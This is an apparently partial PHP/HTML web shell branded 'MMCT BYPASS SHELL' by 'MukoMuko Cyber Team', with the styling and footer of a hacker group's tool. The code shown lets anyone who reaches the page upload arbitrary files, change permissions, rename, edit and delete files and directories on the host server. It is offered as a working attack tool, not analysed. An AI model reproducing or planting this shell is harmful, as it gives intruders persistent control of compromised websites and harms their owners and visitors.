...
<style type="text/css">
body { font-family: Kelly Slab; background-color: black; background:black url("") center right no-repeat; }
#content tr:hover{
...
h1 { color:white; font-size: 50px; font-family: Kelly Slab; text-align: center; text-shadow: 0px 0px 5px rgb(255, 0, 0); font-weight: bold; letter-spacing: 5px; }
table, th, td {
...
<center><img src="https://h.top4top.io/p_29880q1049.png" width="250px" height="250px"></center></img>
<a href="?"><h1> MMCT BYPASS SHELL </h1></a> 
<BODY>
...
UPLOAD FILE: <input type="file" name="file" style="color:white;border:2px solid white;" requiwhite/></font>
<input type="submit" value="GASSKEN" style="margin-top:4px;width:100px;height:27px;font-family:Kelly Slab;font-size:15;background:black;color: white;border:2px solid white;border-radius:5px"/>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<br><br><font color="lime">SUCCESSFULLY TO UPLOAD</font><br/>';
}else{
...
echo '<br><br><font color="lime">SUCCESSFULLY TO CHANGE PREMISSION</font><br/>';
}else{
echo '<script>alert("FAIL TO CHANGE PREMISSION")</script>';
}
}
...
echo '<br><br><font color="lime">SUCCESS TO CHANGE NAME</font><br/>';
}else{
echo '<script>alert("FAIL TO CHANGE NAME")</script>';
}
...
echo '<br><br><font color="lime">SUCCESS TO SAVE</font><br/>';
}else{
...
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<br><br><font color="lime">SUCCESSFULLY TO DELETE</font><br/>';
}else{
...
<th><center>PREMISSION</center></th>
...
echo '<center><br/><font face="Kelly Slab" color="white" style="text-shadow:0 0 5px white; font-weight:bold: white; font-size:15px; letter-spacing: 5px;"> SonySec07 | MukoMuko Cyber Team | Ver3.2</center>
</body>
</html>';
function perms($file){
